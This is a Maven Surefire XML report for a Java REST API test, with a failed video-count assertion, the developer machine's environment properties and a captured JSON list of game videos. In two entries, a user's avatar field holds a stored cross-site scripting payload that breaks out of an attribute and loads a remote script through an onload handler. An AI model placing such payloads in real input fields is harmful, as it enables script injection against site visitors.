<?xml version="1.0" encoding="UTF-8"?>
<testsuite xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="https://maven.apache.org/surefire/maven-surefire-plugin/xsd/surefire-test-report.xsd" name="com.emma.app.my_rest_test.HttpClientTest" time="0.929" tests="1" errors="0" skipped="0" failures="1">
  <properties>
    <property name="java.runtime.name" value="Java(TM) SE Runtime Environment"/>
    <property name="sun.boot.library.path" value="D:\Program Files\Java\jdk1.8.0_101\jre\bin"/>
    <property name="java.vm.version" value="25.101-b13"/>
    <property name="java.vm.vendor" value="Oracle Corporation"/>
    <property name="maven.multiModuleProjectDirectory" value="D:\workspace\my-rest-test"/>
    <property name="java.vendor.url" value="http://java.oracle.com/"/>
    <property name="path.separator" value=";"/>
    <property name="guice.disable.misplaced.annotation.check" value="true"/>
    <property name="java.vm.name" value="Java HotSpot(TM) 64-Bit Server VM"/>
    <property name="file.encoding.pkg" value="sun.io"/>
    <property name="user.script" value=""/>
    <property name="user.country" value="CN"/>
    <property name="sun.java.launcher" value="SUN_STANDARD"/>
    <property name="sun.os.patch.level" value=""/>
    <property name="java.vm.specification.name" value="Java Virtual Machine Specification"/>
    <property name="user.dir" value="D:\workspace\my-rest-test"/>
    <property name="java.runtime.version" value="1.8.0_101-b13"/>
    <property name="java.awt.graphicsenv" value="sun.awt.Win32GraphicsEnvironment"/>
    <property name="java.endorsed.dirs" value="D:\Program Files\Java\jdk1.8.0_101\jre\lib\endorsed"/>
    <property name="os.arch" value="amd64"/>
    <property name="java.io.tmpdir" value="C:\Users\kascend\AppData\Local\Temp\"/>
    <property name="line.separator" value="&#10;"/>
    <property name="java.vm.specification.vendor" value="Oracle Corporation"/>
    <property name="user.variant" value=""/>
    <property name="os.name" value="Windows 7"/>
    <property name="classworlds.conf" value="D:\workspace\.metadata\.plugins\org.eclipse.m2e.launching\launches\m2conf6265948367918108853.tmp"/>
    <property name="sun.jnu.encoding" value="GBK"/>
    <property name="java.library.path" value="D:\Program Files\Java\jdk1.8.0_101\bin;C:\Windows\Sun\Java\bin;C:\Windows\system32;C:\Windows;C:/Program Files/Java/jre1.8.0_101/bin/server;C:/Program Files/Java/jre1.8.0_101/bin;C:/Program Files/Java/jre1.8.0_101/lib/amd64;C:\ProgramData\Oracle\Java\javapath;D:\Program Files (x86)\DongZhouSoft\SmartSDK\platform-tools;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files (x86)\Intel\OpenCL SDK\2.0\bin\x86;C:\Program Files (x86)\Intel\OpenCL SDK\2.0\bin\x64;D:\DTLDownLoads\adt-bundle-windows-x86_64-20131030\sdk\platform-tools;D:\DTLDownLoads\adt-bundle-windows-x86_64-20131030\sdk\tools;D:\Program Files\TortoiseSVN\bin;C:\Program Files\Java\jdk1.6.0_29\bin;D:\DTLDownLoads\adt-bundle-windows-x86_64-20131030\sdk\tools;D:\DTLDownLoads\adt-bundle-windows-x86_64-20131030\sdk\platform-tools;D:\Tools\apache-ant-1.9.4-bin\apache-ant-1.9.4/bin;D:\Tools\apache-ant-1.9.4-bin\apache-ant-1.9.4/lib;C:\Program Files (x86)\EmEditor;D:\Program Files\Python27;C:\Program Files (x86)\Spoon\Cmd;E:\tools\apache-maven-3.3.9\bin;C:\Program Files\nodejs\;C:\ProgramData\Oracle\Java\javapath;D:\Program Files (x86)\DongZhouSoft\SmartSDK\platform-tools;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files (x86)\Intel\OpenCL SDK\2.0\bin\x86;C:\Program Files (x86)\Intel\OpenCL SDK\2.0\bin\x64;D:\DTLDownLoads\adt-bundle-windows-x86_64-20131030\sdk\platform-tools;D:\DTLDownLoads\adt-bundle-windows-x86_64-20131030\sdk\tools;D:\Program Files\TortoiseSVN\bin;D:\Program Files\Java\jdk1.8.0_101\bin;D:\Tools\apache-ant-1.9.4-bin\apache-ant-1.9.4/bin;D:\Tools\apache-ant-1.9.4-bin\apache-ant-1.9.4/lib;C:\Program Files (x86)\EmEditor;D:\Program Files\Python27;C:\Program Files (x86)\Spoon\Cmd;E:\tools\apache-maven-3.3.9\bin;C:\Program Files\nodejs\;D:\Tools\apache-maven-3.2.1-bin\apache-maven-3.2.1\bin;C:\Program Files\Java\jdk1.6.0_29\bin;D:\python;C:\Program Files\nodejs;D:\Tools\apache-maven-3.3.3-bin\apache-maven-3.3.3\bin;D:\Program Files (x86)\SSH Communications Security\SSH Secure Shell;C:\Users\kascend\AppData\Roaming\npm\;D:\eclipse-reporting-luna-SR2-win32-x86_64\eclipse;;."/>
    <property name="java.specification.name" value="Java Platform API Specification"/>
    <property name="java.class.version" value="52.0"/>
    <property name="sun.management.compiler" value="HotSpot 64-Bit Tiered Compilers"/>
    <property name="os.version" value="6.1"/>
    <property name="user.home" value="C:\Users\kascend"/>
    <property name="user.timezone" value="Asia/Shanghai"/>
    <property name="java.awt.printerjob" value="sun.awt.windows.WPrinterJob"/>
    <property name="java.specification.version" value="1.8"/>
    <property name="file.encoding" value="GBK"/>
    <property name="user.name" value="kascend"/>
    <property name="java.class.path" value="/D:/eclipse-reporting-luna-SR2-win32-x86_64/eclipse/plugins/org.eclipse.m2e.maven.runtime_1.7.0.20160603-1931/jars/plexus-classworlds-2.5.2.jar"/>
    <property name="java.vm.specification.version" value="1.8"/>
    <property name="sun.arch.data.model" value="64"/>
    <property name="java.home" value="D:\Program Files\Java\jdk1.8.0_101\jre"/>
    <property name="sun.java.command" value="org.codehaus.plexus.classworlds.launcher.Launcher -B test"/>
    <property name="java.specification.vendor" value="Oracle Corporation"/>
    <property name="user.language" value="zh"/>
    <property name="awt.toolkit" value="sun.awt.windows.WToolkit"/>
    <property name="java.vm.info" value="mixed mode"/>
    <property name="java.version" value="1.8.0_101"/>
    <property name="java.ext.dirs" value="D:\Program Files\Java\jdk1.8.0_101\jre\lib\ext;C:\Windows\Sun\Java\lib\ext"/>
    <property name="sun.boot.class.path" value="D:\Program Files\Java\jdk1.8.0_101\jre\lib\resources.jar;D:\Program Files\Java\jdk1.8.0_101\jre\lib\rt.jar;D:\Program Files\Java\jdk1.8.0_101\jre\lib\sunrsasign.jar;D:\Program Files\Java\jdk1.8.0_101\jre\lib\jsse.jar;D:\Program Files\Java\jdk1.8.0_101\jre\lib\jce.jar;D:\Program Files\Java\jdk1.8.0_101\jre\lib\charsets.jar;D:\Program Files\Java\jdk1.8.0_101\jre\lib\jfr.jar;D:\Program Files\Java\jdk1.8.0_101\jre\classes"/>
    <property name="java.vendor" value="Oracle Corporation"/>
    <property name="maven.home" value="D:\workspace\my-rest-test\EMBEDDED"/>
    <property name="file.separator" value="\"/>
    <property name="java.vendor.url.bug" value="http://bugreport.sun.com/bugreport/"/>
    <property name="sun.cpu.endian" value="little"/>
    <property name="sun.io.unicode.encoding" value="UnicodeLittle"/>
    <property name="sun.desktop" value="windows"/>
    <property name="sun.cpu.isalist" value="amd64"/>
  </properties>
  <testcase name="productInfo on productInfo(com.emma.app.my_rest_test.HttpClientTest)" classname="com.emma.app.my_rest_test.HttpClientTest" time="0.336">
    <failure message="返回的视频数量不一致 expected [12652] but found [12658]" type="java.lang.AssertionError">java.lang.AssertionError: 返回的视频数量不一致 expected [12652] but found [12658]
	at com.emma.app.my_rest_test.HttpClientTest.productInfo(HttpClientTest.java:65)
</failure>
    <system-out><![CDATA[http://183.129.155.244:8833/jellyfish-server/xapi/game-video/list.htm?_sign=74b0c721718267aef1868e894aec050b&_appkey=CSAndroidSDK&_identifier=475213605&_sdkVersion=1.0.8.5946&_xappkey=1f7ce3cc55184019&gameId=1008&pageSize=20
200
0
{"code":0,"data":{"count":12658,"items":[{"cover":"","meta":{"duration":"04:03","playCount":705648,"creator":"ppppppppppp","gender":"male","giftCount":10475,"createdTime":1442933743000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":26},"name":"天天酷跑天義测评炫动战车","style":5,"type":3,"targetKey":"19"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1442936788912.jpg!jellyfishnavstyle1","meta":{"duration":"03:58","playCount":69794,"creator":"485","gender":"female","giftCount":110,"createdTime":1442936971000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":125},"name":"你们要的修改方法叫我雷锋【天義作品】浪花走一走","style":5,"type":3,"targetKey":"24"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443068522539.jpg!jellyfishnavstyle1","meta":{"duration":"13:37","playCount":68325,"creator":"用户不存在","gender":"unknow","giftCount":10050,"createdTime":1443068698000,"avatar":"","commentCount":254},"name":"小美哥：花钱秒满所有碎片宝物！","style":5,"type":3,"targetKey":"84"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/270113/1443112616493_crop.jpg!jellyfishnavstyle1","meta":{"duration":"09:48","playCount":40576,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443112640000,"avatar":"","commentCount":130},"name":"王冕：教你如何高概率获得积分雨","style":5,"type":3,"targetKey":"97"},{"cover":"","meta":{"duration":"25:49","playCount":28834,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443072888000,"avatar":"","commentCount":132},"name":"小美哥：嗓子中毒了也要风骚！","style":5,"type":3,"targetKey":"87"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443000797136.jpg!jellyfishnavstyle1","meta":{"duration":"12:32","playCount":22437,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001613000,"avatar":"","commentCount":69},"name":"小美哥：完美侍女-完美评测！","style":5,"type":3,"targetKey":"51"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443521068664.jpg!jellyfishnavstyle1","meta":{"duration":"06:48","playCount":21628,"creator":"用户不存在","gender":"unknow","giftCount":33,"createdTime":1443521778000,"avatar":"","commentCount":54},"name":"美兔组合：小兔说要陪我一起卖肥皂！","style":5,"type":3,"targetKey":"185"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442947729046_crop.jpg!jellyfishnavstyle1","meta":{"duration":"40:03","playCount":20303,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1442981524000,"avatar":"","commentCount":99},"name":"小美哥：酷跑2周年-充钱秒杀所有装备！","style":5,"type":3,"targetKey":"38"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443520976140.jpg!jellyfishnavstyle1","meta":{"duration":"06:23","playCount":17595,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443521775000,"avatar":"","commentCount":6},"name":"美兔组合：小兔居然是美少女的化身！","style":5,"type":3,"targetKey":"184"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443375291729.jpg!jellyfishnavstyle1","meta":{"duration":"04:04","playCount":15973,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443375403000,"avatar":"","commentCount":39},"name":"天義∶白马大圣闹闹这分数不要不要的","style":5,"type":3,"targetKey":"149"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442943878780_crop.jpg!jellyfishnavstyle1","meta":{"duration":"10:15","playCount":13631,"creator":"485","gender":"female","giftCount":0,"createdTime":1442947437000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":28},"name":"小美哥：白龙马7千米爆分秀！","style":5,"type":3,"targetKey":"32"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443756523512.jpg!jellyfishnavstyle1","meta":{"duration":"01:34","playCount":12612,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443756551000,"avatar":"","commentCount":11},"name":"天義∶积分雨怎么来的仔细看30秒的时候~","style":5,"type":3,"targetKey":"276"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443000726614.jpg!jellyfishnavstyle1","meta":{"duration":"13:10","playCount":11184,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001588000,"avatar":"","commentCount":27},"name":"小美哥：超能少年碎片-全部秒满级！","style":5,"type":3,"targetKey":"49"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443372312906.png!jellyfishnavstyle1","meta":{"duration":"01:30","playCount":10305,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443372431000,"avatar":"","commentCount":11},"name":"勇气大陆第30关经典三星过关","style":5,"type":3,"targetKey":"147"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/171/1447392587015.jpg!jellyfishnavstyle1","meta":{"duration":"00:15","playCount":10006,"creator":"用户_171","gender":"male","giftCount":12123,"createdTime":1447392594000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/20160630/171_1467278870639.jpg","commentCount":2},"name":"好好看","style":5,"type":3,"targetKey":"11746"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1442999740013.jpg!jellyfishnavstyle1","meta":{"duration":"10:38","playCount":9196,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001611000,"avatar":"","commentCount":36},"name":"小美哥：疯狂花钻石-秒宝物碎片！","style":5,"type":3,"targetKey":"50"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443684567470.jpg!jellyfishnavstyle1","meta":{"duration":"07:12","playCount":7340,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443684593000,"avatar":"","commentCount":9},"name":"天義∶下次卡无限钥匙理解一下这次没时间 猪大家国庆节快乐","style":5,"type":3,"targetKey":"248"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443521046527.jpg!jellyfishnavstyle1","meta":{"duration":"05:10","playCount":5586,"creator":"用户不存在","gender":"unknow","giftCount":5315,"createdTime":1443521772000,"avatar":"","commentCount":10},"name":"美兔组合：咱们的酷跑一直都在！","style":5,"type":3,"targetKey":"183"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443001787624.jpg!jellyfishnavstyle1","meta":{"duration":"01:45","playCount":5496,"creator":"用户不存在","gender":"unknow","giftCount":10,"createdTime":1443001894000,"avatar":"","commentCount":99},"name":"小美哥献唱：夜曲，难听也要说好听！","style":5,"type":3,"targetKey":"52"},{"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443284993692_crop.jpg!jellyfishnavstyle1","meta":{"duration":"02:20","playCount":5120,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443285063000,"avatar":"","commentCount":9},"name":"勇士大陆26关一命三星闯关。","style":5,"type":3,"targetKey":"125"}],"breakpoint":"125-5120"},"message":""}
]]></system-out>
    <system-err><![CDATA[log4j:WARN No appenders could be found for logger (org.apache.http.impl.conn.BasicClientConnectionManager).
log4j:WARN Please initialize the log4j system properly.
log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.
]]></system-err>
  </testcase>
</testsuite>